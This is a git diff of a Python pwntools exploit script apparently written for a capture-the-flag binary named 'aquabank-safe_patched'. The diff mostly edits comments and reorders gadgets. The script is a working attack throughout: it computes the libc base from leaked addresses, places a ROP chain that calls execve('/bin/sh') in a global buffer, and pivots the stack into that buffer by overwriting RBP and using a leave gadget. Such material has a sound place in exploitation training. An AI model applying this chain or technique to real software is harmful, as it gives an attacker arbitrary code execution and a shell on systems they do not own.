@@ -2,19 +2,16 @@
 
 from pwn import *
 """
-Explanation:
 The idea is to exploit the stack pivoting using the global buffer VAULT
-So we "create" a fake
+So we "create" a fake frame
+Step 1) Derive libc_base address starting from the leak addresses given us
+Step 2) Store the ROP CHAIN that spawn the shell inside  VAULT 
+Step 3) Pivoting the execution into VAULT by overwrite the RBP of open safe function with the address of VAUL, so when LEAVE 
+        is executed the address of VAULT became the new RSP and the execution continue from that point
 
 
-Steps of the ROP chain:
-    1. Stack alignment (RET)
-    2. Set RAX = 0
-    3. Set RDI = pointer_to("/bin/sh")
-    4. Set RSI = 0
-    5. Move RAX → RDX using XCHG (since we don't have pop rdx)
-    6. Stack alignment (RET)
-    7. Call execve()
+
+
 
 """
 exe = ELF("./aquabank-safe_patched")
@@ -59,7 +56,7 @@ def main():
     #log.info(f"PIE BASE={hex(pie_base)}")
     print(hex(libc_base))
     print(hex(pie_base))
-    rop =ROP(exe)
+    rop = ROP(exe)
     rop_libc = ROP(libc)
 
     POP_RDI = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
@@ -88,18 +85,8 @@ def main():
 
     p.sendline(b"16000")
     print(p.recvline())
-    """
-    Steps of the ROP chain:
-        1. Stack alignment (RET)
-        2. Set RAX = 0
-        3. Set RDI = pointer_to("/bin/sh")
-        4. Set RSI = 0
-        5. Move RAX → RDX using XCHG (since we don't have pop rdx)
-        6. Stack alignment (RET)
-        7. Call execve()
-
-    """
-    #execve call --> RDX=0, RDI=0,RDI="function_to_call" 
+  
+    #execve call --> RDI="function_to_call", RSI=0, RDX=0
     log.info(f"VAULT ADDR:{hex( VAULT)}")
     rop_chain = flat(
         # p64(ret),
@@ -107,16 +94,16 @@ def main():
         b"A" * 8,
         # p64(0x0),
         p64(RET_LIBC),
-        p64(POP_RAX), p64(0),   # since POP RDX in not avaiable we can use the first part(8bit) of RAX an then exchange it with the first part (8bit) of RDX
-        p64(POP_RDI),
-        p64(BINSH),
+        p64(POP_RDI),p64(BINSH),
+
         p64(POP_RSI),p64(0),
-        p64(XCHG_EDX_EAX), 
-        # p64(base_pie + exe.symbols["menu"]),
-        # b"A" * 128,
+
+        p64(POP_RAX), p64(0),   # since POP RDX in not avaiable we can use the first part(8bit) of RAX an 
+                                #then exchange it with the first part (8bit) of RDX
+        p64(XCHG_EDX_EAX), # RDX = RAX
+        
         p64(RET_LIBC),
         p64(libc.symbols["execve"]),
-        # p64(libc.symbols["puts"]),
     )
 
    # p.sendline(str(len(rop_chain)).encode())
@@ -128,8 +115,6 @@ def main():
 
     p.sendline(b"3")
     p.recvuntil(b"combination:\n")
-    #-------------stage2-------------
-
 
 
     pause()
@@ -137,9 +122,11 @@ def main():
         b"A" * 8,
         p64(VAULT), #put the VAULT address on the stack
         p64(LEAVE)  #The leave instruction do the following set of instruction
-                    #MOV ESP, EBP + POP RBP 
-                    #so when the rop chain will be execute the RBP addres will we overwrited with the addres of VAULT enabling the "moving" of the execution into
-                    # a new frame
+                    #MOV RSP, RBP 
+                    #POP RBP 
+                    #so when the rop chain will be execute the RBP addres will we overwrited with the addres of VAULT  
+                    # then when MOV RSP, EBP is executed the VAULT addres become the next RSP and the execution start
+                    # from the addres of VAULT 
     
     )
     p.sendline(payload_stage2)
